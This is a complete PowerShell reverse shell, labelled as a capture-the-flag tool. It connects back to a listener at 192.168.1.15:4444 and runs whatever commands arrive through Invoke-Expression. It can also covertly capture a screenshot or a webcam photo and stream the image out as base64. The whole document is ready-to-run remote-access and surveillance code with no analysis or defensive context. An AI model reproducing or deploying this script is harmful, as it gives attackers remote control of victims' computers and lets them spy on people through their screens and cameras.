# --- THE ULTIMATE ATOMIC CTF SHELL: LOCK-IN EDITION ---
$ip = '192.168.1.15'
$port = 4444

# Setup the Socket
$c = New-Object System.Net.Sockets.TCPClient
try {
    $c.Connect($ip, $port)
    $s = $c.GetStream()
    $r = New-Object System.IO.StreamReader($s)
    $w = New-Object System.IO.StreamWriter($s)
    $w.AutoFlush = $true

    $w.WriteLine("--- MEOW ---")

    while($c.Connected) {
        $w.Write("PS " + (Get-Location).Path + "> ")
        $line = $r.ReadLine()
        if ($null -eq $line) { break }
        
        $cmd = $line.Trim()
        if ($cmd -eq "exit") { break }
        if ([string]::IsNullOrWhiteSpace($cmd)) { continue }

        # --- BRANCHING LOGIC ---
        if ($cmd -eq "screenshot") {
            try {
                Add-Type -AssemblyName System.Windows.Forms, System.Drawing
                $rect = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                $bmp  = New-Object System.Drawing.Bitmap($rect.Width, $rect.Height)
                $g    = [System.Drawing.Graphics]::FromImage($bmp)
                $g.CopyFromScreen($rect.Location, [System.Drawing.Point]::Empty, $rect.Size)
                $mem  = New-Object System.IO.MemoryStream
                $bmp.Save($mem, [System.Drawing.Imaging.ImageFormat]::Jpeg)
                $out  = [Convert]::ToBase64String($mem.ToArray())
                $g.Dispose(); $bmp.Dispose(); $mem.Dispose()
                $w.WriteLine($out)
            } catch { $w.WriteLine("Screenshot Error: $($_.Exception.Message)") }
        } 
        elseif ($cmd -eq "webcam") {
            try {
                # 1. Load the WinRT Core and Extensions
                [void][Windows.Media.Capture.MediaCapture, Windows.Media.Capture, ContentType=WindowsRuntime]
                [void][Windows.Media.MediaProperties.ImageEncodingProperties, Windows.Media.Properties, ContentType=WindowsRuntime]
                
                $mc = New-Object Windows.Media.Capture.MediaCapture
                
                # 2. Forced Initialization Sync
                $init = $mc.InitializeAsync()
                while ($init.Status -eq 'Started') { Start-Sleep -Milliseconds 200 }
                $init.GetResults() | Out-Null
                
                # Give the hardware a second to breathe
                Start-Sleep -Seconds 1
                
                # 3. Prepare the Photo Capture
                $fmt = [Windows.Media.MediaProperties.ImageEncodingProperties]::CreateJpeg()
                $prep = $mc.PrepareLowLagPhotoCaptureAsync($fmt)
                while ($prep.Status -eq 'Started') { Start-Sleep -Milliseconds 200 }
                $lowLag = $prep.GetResults()
                
                # 4. Snap the frame
                $snap = $lowLag.CaptureAsync()
                while ($snap.Status -eq 'Started') { Start-Sleep -Milliseconds 200 }
                $photo = $snap.GetResults()
                
                # 5. THE FIX: Explicit Stream Conversion
                # We use the static extension method to bridge WinRT to .NET
                $asStream = [System.IO.WindowsRuntimeStreamExtensions]::AsStreamForRead($photo.Frame)
                $ms = New-Object System.IO.MemoryStream
                $asStream.CopyTo($ms)
                
                $out = [Convert]::ToBase64String($ms.ToArray())
                
                # 6. Cleanup
                $ms.Dispose(); $asStream.Dispose(); $mc.Dispose()
                $w.WriteLine($out)
            } catch {
                $w.WriteLine("Webcam Error: $($_.Exception.Message)")
            }
        } 
        else {
            # Standard Shell Commands
            try {
                $out = Invoke-Expression $cmd 2>&1 | Out-String
                if ([string]::IsNullOrWhiteSpace($out)) { $out = "Command Executed." }
                $w.WriteLine($out)
            } catch { $w.WriteLine("Shell Error: $($_.Exception.Message)") }
        }
    }
} catch {
    # Connection failed
} finally {
    if ($c) { $c.Close() }
}
